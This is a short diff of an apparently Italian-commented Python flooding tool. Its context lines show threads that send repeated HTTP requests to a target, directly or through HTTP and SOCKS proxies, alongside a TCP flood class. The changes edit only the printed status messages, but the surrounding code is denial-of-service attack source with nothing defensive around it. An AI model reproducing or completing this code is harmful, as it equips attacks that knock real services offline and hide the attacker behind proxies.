@@ -701,17 +701,17 @@ def loop():
 				if choice3 == "0": # e abbiamo scelto gli HTTP proxy
 					for x in range(threads):
 						RequestProxyHTTP(x+1).start() # starta la classe apposita
-						print ("Thread " + str(x) + " ready!")
+						print ("Thread " + str(x) + " Ready !")
 					go.set() # questo fa avviare i threads appena sono tutti pronti
 				else: # se abbiamo scelto i socks
 					for x in range(threads):
 						RequestSocksHTTP(x+1).start() # starta la classe apposita
-						print ("Thread " + str(x) + " ready!")
+						print ("Thread " + str(x) + " Ready !")
 					go.set() # questo fa avviare i threads appena sono tutti pronti
 			else: # altrimenti manda richieste normali non proxate.
 				for x in range(threads):
 					RequestDefaultHTTP(x+1).start() # starta la classe apposita
-					print ("Thread " + str(x) + " ready!")
+					print ("Thread " + str(x) + " Ready !")
 				go.set() # questo fa avviare i threads appena sono tutti pronti
 
 class TcpFloodProxed(threading.Thread): # la classe del multithreading
@@ -964,7 +964,7 @@ class RequestSocksHTTP(threading.Thread): # la classe del multithreading
 				s = socks.socksocket() # creazione socket con pysocks
 				s.connect((str(url2), int(urlport))) # connessione
 				s.send (str.encode(request)) # invio
-				print ("Request sent from " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) # print req + counter
+				print (" " + str(proxy[0]+":"+proxy[1]) + " ", ) # print req + counter
 				try: # invia altre richieste nello stesso thread
 					for y in range(multiple): # fattore di moltiplicazione
 						s.send(str.encode(request)) # encode in bytes della richiesta HTTP
